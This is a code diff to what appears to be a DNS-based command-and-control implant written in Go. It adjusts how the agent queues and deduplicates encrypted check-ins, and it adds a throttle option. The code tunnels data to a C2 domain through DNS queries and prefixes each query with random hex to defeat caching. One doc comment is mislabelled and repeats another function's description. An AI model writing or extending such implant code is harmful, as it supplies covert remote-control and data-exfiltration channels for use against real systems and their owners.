@@ -114,11 +114,14 @@ func (a *Agent) CheckIn() {
 	// the operator may choose to delete the agent and allow first ping again
 	if a.crypto.secret == nil {
 		log.Printf("checking in with dummy data (no secret computed yet)\n")
+		a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
 		a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
 		return
 	}
-	log.Printf("checking in with encrypted data\n")
-	a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
+	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) {
+		log.Printf("checking in with encrypted data\n")
+		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
+	}
 }
 
 // SendEncrypted will encrypt a message byte array and add it to the sendq
@@ -174,7 +177,6 @@ func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 // Run executes the functions required by the main loop
 func (a *Agent) Run() {
 	a.ProcessSendQ()
-	a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
 	a.CheckIn()
 }
 
@@ -186,6 +188,16 @@ func (a *Agent) CleanupSendQ(cleanupCommand AgentCommand) {
 			delete(a.sendq, item)
 		}
 	}
+}
+
+// CleanupSendQ removes specified AgentCommand queue items
+func (a *Agent) IsCommandInSendQ(cleanupCommand AgentCommand) bool {
+	for _, command := range a.sendq {
+		if command == cleanupCommand {
+			return true
+		}
+	}
+	return false
 }
 
 // ProcessSendQ is called by agent loop to send data back to c2
@@ -209,10 +221,10 @@ func (a *Agent) ProcessSendQ() {
 		return
 	}
 
-	for item := range a.sendq {
+	for sendQItem := range a.sendq {
 		// first 4 bytes will be randomized for every request to prevent dns caching
 		antiCacheValue := a.crypto.RandomHexString(4)
-		query := antiCacheValue + "." + item + "." + a.config.C2Domain
+		query := antiCacheValue + "." + sendQItem + "." + a.config.C2Domain
 
 		// var err error
 		var c2Response []string
@@ -253,7 +265,7 @@ func (a *Agent) ProcessSendQ() {
 		if len(c2Response) > 0 {
 			// process response
 			log.Printf("c2 response for %q: %s\n", query, c2Response)
-			delete(a.sendq, item)
+			delete(a.sendq, sendQItem)
 			a.ProcessResponse(c2Response)
 		} else {
 			log.Printf("c2 response for: %q was empty\n", query)
@@ -269,6 +281,11 @@ func (a *Agent) ProcessSendQ() {
 		// 	delete(a.sendq, item)
 		// 	a.ProcessResponse(response)
 		// }
+
+		// only one SendQ item at a time if throttled
+		if a.config.ThrottledSendQ == true {
+			return
+		}
 	}
 }
 
